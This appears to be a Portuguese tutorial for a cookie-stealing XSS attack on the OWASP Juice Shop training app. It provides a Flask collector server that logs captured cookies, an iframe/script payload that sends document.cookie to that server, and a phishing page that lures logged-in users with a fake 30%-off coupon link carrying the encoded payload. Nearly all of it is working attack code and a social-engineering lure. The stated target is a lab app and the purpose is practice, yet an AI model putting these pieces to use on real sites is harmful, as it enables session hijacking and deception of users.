## Web-Server Exfiltration Basic Python

Copiar o código python e salvar como web-srv.py

Executar $python ./web-srv.py

```
#!/usr/bin/env python3

from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
Payload XSS para teste:

Copie o payload e cole no campo de pesquisa do Juice-Shop
```
<iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
```
## Web-Server Exfiltration Web Link Python

Estrutura:

Web-srv\
       |_web-srv.py\
       |_templates\
                  |_index.html\

Criar um diretório com o nome Web-srv

Copiar o código python e salvar como web-srv.py

```
#!/usr/bin/env python3

from flask import Flask, request, make_response, render_template

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookie = request.form.get('cookie')
    with open('captured_cookies.txt', 'a') as f:
        f.write(cookie + '\n')
    return ''

@app.route("/")
def home():
    return render_template("index.html")
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
Criar um diretório como o nome templates

Copiar o código html e salvar como index.html dentro do diretório templates

```
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Juice-Shop Cupons</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0066cc;
            margin-bottom: 20px;
        }
        a {
            color: #fff;
            background-color: #0066cc;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        a:hover {
            background-color: #004999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Refresque o seu dia pagando menos! Pegue seu cupom exclusivo e aproveite 100% de sabor com 30% de desconto</h1>
        <h2>Aviso: Para receber o cupom o cliente deve estar logado no Juice-Shop!</h2>
        <p>Clique no link abaixo para receber seu cupom:</p>
        <a href="http://localhost:3000/#/search?q=%3Ciframe%20srcdoc%3D%22%3Cscript%3E%20fetch%28%27http%3A%2F%2F127.0.0.1%2Fcapture%3Ftoken%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E" target="_blank">Cupom Promocional</a>
    </div>
</body>
</html>
```
Executar $python ./web-srv.py
